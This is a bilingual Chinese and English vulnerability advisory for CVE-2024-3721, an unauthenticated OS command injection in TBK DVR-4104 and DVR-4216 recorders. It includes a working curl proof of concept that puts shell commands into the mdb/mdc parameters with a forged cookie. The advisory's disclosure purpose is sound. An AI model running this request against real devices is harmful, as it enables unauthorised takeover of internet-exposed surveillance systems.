# CVE-2024-3721

>   TBK DVR硬盘录像机是一套进行图像计算存储处理的计算机系统，具有对图像语音邓进行长时间录像、录音、远程监控和控制功能。

## 来源

[https://github.com/netsecfish/tbk_dvr_command_injection](https://github.com/netsecfish/tbk_dvr_command_injection)

## 简介

TBK DVR-4104和DVR-4216设备在20240412之前的版本中发现了一个严重漏洞存在命令注入漏洞，该问题影响到文件/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___的某些未知处理方式。对参数mdb/mdc的操纵会导致操作系统命令注入，未授权的攻击者可以通过该漏洞远程控制系统。

## 漏洞类型

命令注入

## 影响范围

-   TBK DVR-4104和DVR-4216设备在20240412之前的版本

## Overview

The TBK DVR devices are now found to be vulnerable to a more severe command injection. Unlike CVE-2018-9995, the newly discovered vulnerability enables execution of arbitrary commands on the device's operating system, affecting over 114,000 devices on the Internet.

![Untitled](Untitled.png)

## **Affected Devices**

- TBK DVR-4104
- TBK DVR-4216

## **CWE**

CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

## Vulnerability Details

This is achieved through a specially crafted POST request to the `/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___` endpoint. By manipulating the `mdb` and `mdc` parameters, attackers can execute shell commands, as demonstrated by the PoC.

1. The attacker sends a POST request to the vulnerable DVR device:

   ```bash
   curl "http://<dvr_host>:<port>/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=<URL_ENCODED_SHELL_COMMAND>" -H "Cookie: uid=1"
   ```

## Exploitation

### Sample 1

![Untitled](Untitled%201.png)

### Sample 2

![Untitled](Untitled%202.png)

### Sample 3

![Untitled](Untitled%203.png)

## **Impact**

The vulnerability allows unauthorized remote attackers to execute arbitrary commands on the device. This could lead to unauthorized access to device data, modification of system configurations, or a complete compromise of the device.

## **Fix Recommendation:**

- Apply available patches and updates from the device manufacturer.
